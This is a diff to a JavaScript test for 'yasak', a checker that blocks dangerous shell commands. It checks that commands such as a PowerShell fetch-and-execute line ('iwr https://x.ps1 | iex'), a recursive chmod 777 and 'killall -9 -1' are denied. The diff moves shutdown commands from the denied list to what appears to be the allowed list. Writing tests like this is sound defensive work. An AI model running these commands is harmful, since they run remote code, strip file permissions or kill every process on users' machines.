@@ -780,7 +780,6 @@ function testYasak() {
     ['iwr https://x.ps1 | iex', 'yasak.pipe'],
     ['chmod -R 777 .', 'yasak.perm'],
     ['killall -9 -1', 'yasak.kill'],
-    ['shutdown /r /t 0', 'yasak.kill'],
   ];
   for (const [cmd, key] of denied) ok('denies ' + cmd, yasak.forbidden(cmd, GARDEN) === key, String(yasak.forbidden(cmd, GARDEN)));
 
@@ -791,6 +790,8 @@ function testYasak() {
     'Remove-Item -Recurse -Force .\\dist',
     'rmdir /s /q dist',
     'rm build/tmp.txt',
+    'shutdown /s /t 120',
+    'Stop-Computer -Force',
     'git push origin main',
     'git push --force-with-lease origin topic',
     'git reset HEAD~1',
